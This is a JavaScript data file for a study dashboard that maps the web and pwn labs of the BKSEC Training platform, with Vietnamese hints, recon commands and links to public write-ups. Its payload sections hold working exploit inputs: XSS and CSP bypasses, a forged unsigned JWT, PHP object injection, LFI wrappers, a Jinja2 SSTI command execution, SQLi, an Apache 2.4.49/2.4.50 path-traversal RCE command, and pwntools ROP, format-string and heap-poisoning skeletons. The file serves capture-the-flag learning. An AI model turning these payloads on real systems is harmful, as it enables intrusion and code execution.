DATA.find(s => s.id === "training").items.push(
  {
    id: "train-web",
    title: "Web labs — 23",
    summary: "Map 23 lab Web hiện có trên training.bksec.vn. Tick lab đã làm; hint lấy từ writeup public của BKSEC Training 2026. Tên lab lấy từ platform, một số writeup cũ có tên khác.",
    tags: ["training", "web", "lab-map", "2026"],
    priority: "high",
    checklist: [
      "Introduction to Web Exploitation — HTTP, view source, curl, Burp cơ bản.",
      "NASA — recon web/API; xem brief, source, endpoint ẩn (chưa thấy writeup public).",
      "Maze Maze Mazeee — `robots.txt` → base64; BFS các thẻ HTML; round 2 brute danh sách flag.",
      "Red Pill or Blue Pill? — LFI qua `?pill=`; đọc source bằng `php://filter`.",
      "OpenSource is the best — view-source; comment base64; Vite source; dependency version cũ.",
      "Time Traveler — Wayback Machine; xem bản cũ, flag trong comment.",
      "Gambling Coin 1 — JWT không ký → đổi user; hoặc PHP type juggling `1000a`.",
      "low-effort sns — SQLi login MySQL; chú ý đếm bản ghi.",
      "Easy CSP — CSP cho phép cdnjs; bypass bằng AngularJS/JSONP.",
      "Real Gambling Experience — brute-force nhiều session/request để đạt 999.",
      "Report the violations — stored XSS trong comment; bot admin; exfil cookie.",
      "open source is the best 0.5 — Apache 2.4.49/2.4.50 path traversal RCE.",
      "todo-app — stored XSS; Jinja2 SSTI; bypass WAF bằng hex/attr.",
      "Happy Soldier — cookie `save-data` base64 PHP serialize; object injection; sửa stats.",
      "OpenSource is the best 2 — Next.js; API `/profile?id=1` IDOR; đọc profile/flag.",
      "Gambling Coin 2 — PHP type juggling `1e10`/`0e...`; bypass so sánh coins = 9.",
      "Ezzz — SQLite SQLi ở param sort/order; manual, SQLMap không ăn.",
      "Happy Soldier - Revenge — cookie ký; loose compare `sig == md5(...)`; deserialization; đọc `/secret.txt`.",
      "low effort sns 2 — Go API IDOR; `id` đọc secret admin.",
      "Double or Nothing — logic/type coercion; thử `display`, prototype pollution, race.",
      "Medium CSP — CSP + WAF xóa chữ 'script'; tag/event bypass, JSONP/AngularJS.",
      "BKSecPad — XSS WAF chặn tag/event; tìm tag/event chưa chặn; SSRF/DNS rebinding/PNA.",
      "Three Steps to Heaven — `?page=` LFI; phar deserialization; disable_functions bypass."
    ],
    payloads: [
      {
        title: "CSP bypass — AngularJS từ CDN (Echo Chamber)",
        code: C(
          "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js'></scr" + "ipt>",
          "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"
        )
      },
      {
        title: "XSS tag/event khi bị filter (BKSecPad / Report)",
        code: C(
          "<details open ontoggle=alert(1)>",
          "<svg onload=alert(1)>",
          "<marquee onstart=alert(1)>",
          "<video><source onerror=alert(1)>"
        )
      },
      {
        title: "JWT không chữ ký (Gambling Coin)",
        code: C(
          "import base64, json",
          "b64 = lambda x: base64.urlsafe_b64encode(json.dumps(x,separators=(',',':')).encode()).rstrip(b'=').decode()",
          "print(b64({'alg':'none','typ':'JWT'}) + '.' + b64({'user':'admin'}) + '.')"
        )
      },
      {
        title: "PHP type juggling (Gambling Coin / Happy Soldier)",
        code: C(
          "amount=1000a",
          "amount=1e10",
          "amount=0e123456"
        )
      },
      {
        title: "PHP object injection từ cookie (Happy Soldier)",
        code: 'O:6:"Player":4:{s:6:"health";i:9999;s:6:"attack";i:9999;s:5:"coins";i:999;s:6:"weapon";s:12:"Wooden Sword";}'
      },
      {
        title: "LFI / wrapper (Red Pill / Three Steps)",
        code: C(
          "?pill=php://filter/convert.base64-encode/resource=index.php",
          "?page=php://filter/convert.base64-encode/resource=index.php",
          "?page=phar://uploads/shell.phar"
        )
      },
      {
        title: "Jinja2 SSTI (todo-app)",
        code: C(
          "{{7*7}}",
          "{{ config }}",
          "{{ cycler.__init__.__globals__.os.popen('id').read() }}"
        )
      },
      {
        title: "SQLite SQLi (Ezzz / cutie web framework)",
        code: C(
          "' UNION SELECT name,value FROM secrets--",
          "sort=id,(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)"
        )
      },
      {
        title: "IDOR API (low effort sns 2 / OpenSource 2)",
        code: C(
          "GET /api/profile?id=1",
          "GET /api/user/1/secret",
          "GET /graphql?query={users{id,secret}}"
        )
      },
      {
        title: "Apache 2.4.49/2.4.50 path traversal RCE (0.5)",
        code: "curl --path-as-is 'http://TARGET/cgi-bin/.%%32%65/.%%32%65/.%%32%65/bin/sh' -d 'echo Content-Type: text/plain; echo; id'"
      }
    ],
    commands: [
      {
        title: "Recon",
        code: C(
          "curl -i -s http://TARGET/ | head -50",
          "ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc all -fs 0",
          "jwt_tool TOKEN -T"
        )
      }
    ],
    gotchas: [
      "Tên lab lấy từ platform; writeup cũ có thể dùng tên khác (cutie web framework, parrot) — đối chiếu brief.",
      "Một số lab reset mỗi 15 phút; nếu instance chết thì launch lại.",
      "PHP 7 và PHP 8 xử lý type juggling khác nhau; đừng máy móc copy.",
      "WAF chặn tag/event khác nhau; brute danh sách tag/event từ PortSwigger cheat sheet.",
      "Không copy flag; writeup chỉ để hiểu hướng."
    ],
    links: [
      { title: "BKSEC Training", url: "https://training.bksec.vn" },
      { title: "kyrux29 — training web writeups", url: "https://github.com/kyrux29/CTF_WRITEUPS" },
      { title: "bach137here — training 2026 writeups", url: "https://github.com/bach137here/BKSec_Training_2026_WriteUps" },
      { title: "PortSwigger XSS cheat sheet", url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" }
    ]
  },
  {
    id: "train-pwn",
    title: "Pwn labs — 9",
    summary: "Map 9 lab Pwn trên training.bksec.vn, kèm kỹ thuật chính từ solve script public. Tick lab đã làm; đọc Explanation.md khi cần.",
    tags: ["training", "pwn", "lab-map", "2026"],
    priority: "high",
    checklist: [
      "Introduction to Binary Exploitation — file/checksec, stack, calling convention, pwntools.",
      "Buffer Overflow 1 — ret2win; tìm offset bằng cyclic; ghi đè return address.",
      "Introduction to Pwntools — process/remote, sendlineafter, ELF, cyclic.",
      "Rộp Rộp Rộp — ROP; pop rdi/rsi; ret alignment; gọi win.",
      "Bad Seed 1 — PRNG/seed; đoán seed hoặc state.",
      "Integer 1 — signed 32-bit overflow; `2147483647 1` → tổng âm → shell.",
      "Index 1 — array index/OOB; thử index âm/out-of-range.",
      "Bad Seed 2 — PRNG nâng cao; phân tích seed/state.",
      "Baby Heap — UAF/tcache; glibc version; leak heap/libc; poison."
    ],
    payloads: [
      {
        title: "ret2win (Buffer Overflow 1)",
        code: C(
          "from pwn import *",
          "elf = ELF('./chall')",
          "p = process(elf.path)  # remote('HOST', PORT)",
          "offset = cyclic_find(0x6161616c)",
          "payload = flat(b'A'*offset, elf.sym['win'])",
          "p.sendlineafter(b'> ', payload)",
          "p.interactive()"
        )
      },
      {
        title: "ROP + canary (bof_3)",
        code: C(
          "canary = int(p.recvline().strip(), 16)",
          "pop_rdi = 0x401205",
          "pop_rsi = 0x40120e",
          "win = 0x401213",
          "payload = b'A'*88 + p64(canary) + b'B'*8",
          "payload += p64(0x40101a)  # ret alignment",
          "payload += p64(pop_rdi) + p64(0xDEADBEEFDEADBEEF)",
          "payload += p64(pop_rsi) + p64(0xDEADBEEFDEADBEEF)",
          "payload += p64(win)"
        )
      },
      {
        title: "ROP + PIE (bof_4)",
        code: C(
          "pie_base = int(p.recvline().strip(), 16)",
          "pop_rdi = pie_base + 0x11f8",
          "pop_rsi = pie_base + 0x1201",
          "ret = pie_base + 0x101a",
          "win = pie_base + 0x1206",
          "payload = b'A'*104 + p64(ret)",
          "payload += p64(pop_rdi) + p64(0xDEADBEEFDEADBEEF)",
          "payload += p64(pop_rsi) + p64(0xDEADBEEFDEADBEEF)",
          "payload += p64(win)"
        )
      },
      {
        title: "Integer overflow (int_1)",
        code: "2147483647 1"
      },
      {
        title: "Format string arbitrary write (fmt_1/fmt_2)",
        code: C(
          "from pwn import *",
          "elf = ELF('./chall')",
          "p = process(elf.path)",
          "offset = 6",
          "payload = fmtstr_payload(offset, {elf.got['printf']: elf.plt['system']})",
          "p.sendline(payload)"
        )
      },
      {
        title: "ret2libc qua format string leak",
        code: C(
          "p.sendline(b'%p.' * 20)",
          "# tìm leak saved RIP/libc, tính libc_base",
          "payload = flat(b'A'*offset, ret, pop_rdi, binsh, system)",
          "p.sendline(payload)"
        )
      },
      {
        title: "Heap tcache skeleton (Baby Heap)",
        code: C(
          "# 1) leak heap + libc; 2) UAF/double free",
          "# 3) tcache poisoning; safe-linking: ptr ^ (chunk_addr >> 12)",
          "payload = p64(target ^ (chunk_addr >> 12))",
          "edit(idx, payload)"
        )
      }
    ],
    commands: [
      {
        title: "Pwn recon",
        code: C(
          "file chall",
          "checksec --file=chall",
          "cyclic 200",
          "ROPgadget --binary chall | grep 'pop rdi'",
          "one_gadget libc.so.6"
        )
      }
    ],
    gotchas: [
      "Offset/địa chỉ trong writeup là của binary cụ thể; phải chạy lại cyclic/ROPgadget.",
      "bof_3 in canary, bof_4 in PIE base; parse đúng format hex.",
      "Integer 1 lợi dụng signed 32-bit; input parser có thể chặn số lớn.",
      "Baby Heap phụ thuộc glibc: 2.31 có hooks, 2.35+ thường phải FSOP/exit_funcs.",
      "Training instance có thể rotate; lấy lại remote host/port từ platform."
    ],
    links: [
      { title: "TheAbsOne — BKSEC CTF 2026 pwn solves", url: "https://github.com/TheAbsOne/Solve_BKSEC_CTF_2026" },
      { title: "pwn.college", url: "https://pwn.college/" },
      { title: "how2heap", url: "https://github.com/shellphish/how2heap" }
    ]
  }
);
